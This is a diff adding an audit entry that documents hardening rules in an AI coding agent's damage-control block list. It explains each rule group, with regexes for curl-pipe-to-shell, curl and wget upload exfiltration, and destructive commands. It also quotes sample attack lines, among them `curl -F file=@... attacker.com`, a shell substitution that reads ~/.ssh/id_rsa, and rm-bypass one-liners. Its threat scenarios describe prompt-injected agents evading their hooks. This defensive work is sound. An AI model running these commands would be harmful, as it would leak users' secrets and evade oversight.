@@ -470,6 +470,170 @@ Keep as exception. The upstream justfile is scaffolding for a *different* demo r
 
 ---
 
+## Exception 14 — `patterns.yaml` 289-line hardening delta vs upstream
+
+**Decision:** D8 (Option C, structured in-session audit), SP2 round 1 (2026-04-13)
+
+**Path(s):**
+- `.claude/skills/damage-control/patterns.yaml` — the canonical (post-Phase-E) damage-control rule file. ArhuGula form is 899 lines vs upstream `disler/claude-code-damage-control` at 610 lines. Net delta: +289 lines / 53 hunks.
+
+**SP audit round:** SP2 round 1, Phase F D8 audit (2026-04-13)
+**Decision date:** 2026-04-13
+
+**Rationale:**
+
+The `patterns.yaml` file is a configuration surface, not a code module — both ArhuGula and upstream load the same hook scripts and consult the same rule schema. Drift is cumulative additions, not structural redesign. The 289-line delta breaks down into 14 categorical groups, each with a specific threat scenario or usability rationale. Each group is documented below. Round attribution is taken from inline `# Round-N` / `# SP14 round-N` comments embedded in the file when added during the SP14 hardening series; rules without round comments are attributed to "SP2 original (commit 9a7c9f5)" or "SP14 round-2 baseline (commit 50dcfcc)" based on `git log --follow`.
+
+### A. Header reformatting + section separators (stylistic)
+
+ArhuGula form replaces upstream's `# ===` ASCII separators with Unicode box-drawing rules (`# ──`) and adds a documented header per top-level section (`bashToolPatterns`, `zeroAccessPaths`, `readOnlyPaths`, `noDeletePaths`, plus the new `bashToolExclusions`). Stylistic only, no semantic change. Origin: SP2 original.
+
+### B. Removed duplicate `rm -[rRf]` rule (cleanup)
+
+Upstream had two adjacent rules covering `\brm\s+-[rRf]` and `\brm\s+(-[^\s]*)*-[rRf]`. The first is a strict subset of the second (any `-rRf` flag is matched by the bundled-flag form). ArhuGula removed the redundant first rule. Origin: SP2 original.
+
+### C. `chown -R` recursive (hardening)
+
+ArhuGula adds `\bchown\s+-R\b` blocking any recursive chown. Upstream only blocks recursive chown to root specifically. The general rule defends against accidental tree-wide ownership changes that can break uv, npm, and shell history files. Origin: SP2 original.
+
+### D. `git push` to `main` / `master` → ask (opinionated guardrail)
+
+ArhuGula adds two ask-pattern rules:
+- `\bgit\s+push.*\bmain\b` → ask
+- `\bgit\s+push.*\bmaster\b` → ask
+
+These are guardrails against direct-to-main pushes; the hook escalates to user confirmation rather than blocking outright. Origin: SP2 original.
+
+### E. `curl ... | bash|sh|zsh` (standard hardening)
+
+ArhuGula adds `\bcurl\s+.*\|\s*(bash|sh|zsh)` blocking the classic curl-pipe-to-shell installation pattern. Surprisingly absent from upstream. Origin: SP2 original.
+
+### F. Scripting language inline destructive ops (defense-in-depth, ask: true)
+
+ArhuGula adds 4 ask-pattern rules covering inline destructive operations in Python (`-c`), Node (`-e`), Ruby (`-e`), and Perl (`-e`):
+- Python: `rmtree`, `unlink`, `remove`, `rmdir`
+- Node: `unlinkSync`, `rmdirSync`, `rmSync`
+- Ruby: `FileUtils.rm`, `File.delete`, `Dir.rmdir`
+- Perl: `unlink`, `rmdir`, `rmtree`
+
+These close a gap where `rm` patterns scan only shell `rm` invocations, not in-process file operations performed by inline scripting language one-liners. Threat: an agent could call `python -c "import shutil; shutil.rmtree('.git')"` to bypass `\brm\b` patterns. Origin: SP2 original.
+
+### G. `playwright-cli` arbitrary-JS primitives (SP14 r3 + r4)
+
+5 rules covering arbitrary JavaScript execution and file exfiltration via `playwright-cli`:
+- `\bplaywright-cli\b.*\brun-code\b` — block (SP14 r2 baseline)
+- `\bplaywright-cli\b.*\beval\b` — block (SP14 r2 baseline)
+- `\bplaywright-cli\b.*\bupload\b` — ask (SP14 r2 baseline; remote-site filesystem exfiltration)
+- `\bplaywright-cli\b.*\$\(` — block (**SP14 r3** subshell expansion bypass: `playwright-cli fill e1 "$(cat ~/.ssh/id_rsa)"`)
+- ``\bplaywright-cli\b.*` `` — block (**SP14 r4** POSIX backtick command substitution variant)
+- `\bplaywright-cli\b(\s+-\S+)*\s+["']?\$[^\s'"]` — block (**SP14 r3 (r5 patch)** shell-variable subcommand bypass: `SUBCMD=run-code; playwright-cli $SUBCMD ...`)
+
+Threat scenario: prompt-injected playwright stories instruct the agent to read zero-access files via shell expansion in playwright arguments, defeating the per-tool damage-control hooks because the inner read happens at command-evaluation time, never as a separate Bash call. The greedy `.*` between `playwright-cli` and the subcommand is intentional and matches across shell operators (`;`, `&&`, `||`).
+
+### H. `curl` / `wget` file-upload exfiltration (SP14 r3 → r9)
+
+The largest single hardening block (~120 lines). Covers every documented `curl` flag that reads a filesystem path via `@filename` plus the `wget` equivalents and the `-K`/`--config` indirect-read primitive. Per-flag attribution:
+
+| Flag | Variant | SP14 round |
+|---|---|---|
+| `-F` / `--form` | `field=@path` and bare `@path` (round-10 V-8) | r2 baseline + **r10 V-8** |
+| `-d` / `--data` | bundled short form `\s-[A-Za-z]*d` | r3 → **r8 S-34** (POSIX bundling fix) |
+| `--data` | anchored `(?!-)` to not shadow `--data-ascii` etc. | **r10 V-2** |
+| `--data-ascii` / `--data-binary` | dedicated long-flag rules | r3 + r5 (delimiter-form sweep) |
+| `--data-urlencode` | both `@file` and `name@file` forms | **r8 S-35** |
+| `-T` / `--upload-file` | bundled `\s-[A-Za-z]*T` | **r6 S-32** |
+| `-K` / `--config` | indirect file-read via curl config | **r9 S-38** (`case_sensitive: true` to not collide with `-k` / `--insecure`) |
+| `wget --post-file` / `--body-file` | dedicated wget rule | r5 |
+
+**Pattern-authoring convention:** every short-flag pattern uses `\s-[A-Za-z]*<flag>` to defeat POSIX short-option bundling (`-sd`, `-vF`, `-LT`). This convention was violated for `-d` in r7 and rediscovered in r8 (S-34). It is documented in `feedback_curl_short_flag_bundling.md` and must be preserved when adding new short-flag rules.
+
+Threat scenario: combine `playwright-cli screenshot --filename=/tmp/secret.png` with `curl -F file=@/tmp/secret.png attacker.com` to exfiltrate browser-captured frames or arbitrary filesystem content via HTTP POST.
+
+### I. SQL destructive operations (mostly upstream + r10 V-5 multi-line fix + DROP SCHEMA)
+
+ArhuGula moves the SQL block earlier in the file (above the AWS section instead of below npm). Within the moved block:
+
+- `DELETE\s+FROM\s+\w+\s*(?:[;\n]|$)` — **SP14 r10 V-5**: combined the upstream `;`-terminated and `$`-terminated rules into one with a newline alternative. Python's default `re.MULTILINE=False` mode anchors `$` to end-of-string only, so a multi-line command `DELETE FROM users\nSELECT 1` previously slipped past both upstream rules.
+- `\bDROP\s+SCHEMA\b` — added by ArhuGula. Upstream blocks `DROP TABLE` and `DROP DATABASE` but not `DROP SCHEMA`. Origin: SP2 original.
+- `\bCREATE\s+TYPE\s+.*\s+AS\s+ENUM` — ArhuGula opinionated style rule (PostgreSQL ENUMs banned, use CHECK constraints). **Origin: SP2 original. Recommend re-evaluation:** this is style enforcement, not security. It is out of scope for damage-control's threat model and would more naturally live in a project-specific SQL linter. Kept for now to avoid a unilateral revert.
+- `\bCREATE\s+TABLE\s+public\.` and `\bALTER\s+TABLE\s+public\.` — ArhuGula opinionated style rules (public schema banned). **Same recommendation as above.**
+
+### J. `zeroAccessPaths` additions (secrets stores)
+
+ArhuGula adds 4 entries:
+- `.envrc` — direnv config can hold secrets
+- `~/.config/op/` — 1Password CLI config + cached tokens
+- `~/.config/gh/` — GitHub CLI auth tokens
+- `.claude/logs/` — JSONL hook logs that may contain command strings with embedded secrets
+
+Origin: SP2 original. All 4 are defensible secrets-store paths.
+
+### K. `noDeletePaths` additions
+
+ArhuGula adds 2 entries:
+- `database/migrations/` — append-only migration history
+- `prompts/` — prompt-engineering history that should accumulate
+
+Origin: SP2 original. Opinionated but reasonable for ArhuGula's intended workflow.
+
+### L. `bashToolExclusions` section (entirely new)
+
+Upstream has no `bashToolExclusions` section at all. ArhuGula adds 10 allowlist entries used by `bash_damage_control._check_single_command()` as a pre-check before the blocking rules:
+
+- `cat .env.example` / `cat .envrc.example` — safe template reads
+- `grep .envrc/.env.<X>` — safe code references to env-file names
+- `rm *.pyc` / `rm * __pycache__` / `rm * node_modules` — safe cleanup
+- `ls .claude/hooks/` / `cat .claude/hooks/` / `head .claude/hooks/` / `wc .claude/hooks/` — safe debugging reads of hook source
+
+**This section is functionally required for usability.** Without it, common dev operations (`cat .env.example`, `wc .claude/hooks/`) are blocked by zero-access matches even though they are safe. Origin: SP2 original.
+
+### M. SP14 round-10 hardening atoms (round-10 specific)
+
+In addition to V-2, V-5, V-8 listed above, round-10 also adds rules tracked elsewhere in the codebase (not in patterns.yaml itself):
+- **V-3** — pathological tool-name length cap (in `pre_tool_use.check_mcp_tool`)
+- **S-06** — non-ASCII MCP tool name rejection (in `pre_tool_use.check_mcp_tool`)
+
+These are noted here for completeness even though they live in `pre_tool_use.py`, not in `patterns.yaml`.
+
+### N. D10/D11 commented-out rules (Phase A → Phase H)
+
+The `readOnlyPaths` section contains a commented-out block:
+
+```yaml
+  # SP2 audit phase (2026-04-13): both rules temporarily disabled during SP2
+  # decision gate resolution + SP1 resume-pass landing. Re-enabled at Phase I
+  # with `.claude/hooks/*.py` narrowed to a 7-file security-critical explicit
+  # list per D10=A, and `.claude/settings.json` restored per D11=A.
+  # - ".claude/hooks/*.py"
+  # - ".claude/settings.json"
+```
+
+This is the Phase A `feedback_damage_control_self_unlock.md`-compliant temporary relaxation. Phase H restores both rules, with the `.claude/hooks/*.py` rule expanded to the 7-file explicit list per D10=A. Not a permanent exception — the comment block itself disappears at Phase H.
+
+### Categories recommended for re-evaluation (not reverted in this audit)
+
+- I (SQL convention rules): ENUM ban + public schema ban. Style enforcement, not security. Out of damage-control scope.
+
+These are flagged for a future review pass but kept in place for SP2 round 1 to avoid unilateral content changes outside the locked D-decisions. A subsequent audit round (or a SP3 / SP6 cleanup) can revisit.
+
+**Review cadence:** SP14 follow-up rounds (if any new browser-automation tools surface), SP3 audit (validator / linter scope split), and quarterly review of any flagged-for-re-evaluation rules.
+
+**Related findings:**
+- `audits/sp2-patterns-diff.txt` — full unified diff captured during D8.1
+- `audits/SP2-checkpoint.md` — Phase F D8 audit goal + E1 fix dependency
+- `audits/SP2-plan.md` — D8 decision rationale (Option C structured in-session)
+- `feedback_curl_short_flag_bundling.md` — pattern-authoring convention enforcement
+- `feedback_damage_control_self_unlock.md` — Phase A → Phase H authorization envelope
+- `feedback_disler_authoritative.md` — every kept rule is still DRIFT, not MATCH
+
+**Follow-up actions:**
+1. (Phase H) Restore `.claude/hooks/*.py` (as 7-file list) and `.claude/settings.json` rules in `readOnlyPaths`. Remove the commented-out block from this exception's section N.
+2. (Phase I) Re-run `audits/sp2_verify.py` after E1 patch lands; confirm AR4 fnmatch cases still pass.
+3. (Future round) Re-evaluate the 3 SQL convention rules in category I and either move to a project-specific linter or formally accept as a permanent harness-shipped style rule.
+4. (Future SP14 round, if any) Cite new rounds against this exception to maintain rolling round attribution.
+
+---
+
 ## Active exceptions summary
 
 | # | Title | SP | Date | Status | Review when |
@@ -487,6 +651,7 @@ Keep as exception. The upstream justfile is scaffolding for a *different* demo r
 | 11 | `package.json` + `.tool-versions` (D7, load-bearing for SP11) | SP1 r1 | 2026-04-13 | active | SP11 audit / Quarterly |
 | 12 | `.claude/CLAUDE.md` comprehensive doc + nested path | SP1 r1 mini-gate | 2026-04-13 | active | Quarterly |
 | 13 | `justfile` 307-line multi-SP form (security-coupled via `--dangerously-skip-permissions` omission) | SP1 r1 mini-gate | 2026-04-13 | active | Per-SP recipe audits |
+| 14 | `patterns.yaml` 289-line hardening delta (SP14 r2–r10 + SP2-original additions) | SP2 r1 D8 | 2026-04-13 | active | SP14 follow-up rounds / SP3 audit |
 
 ## How to close an exception
 
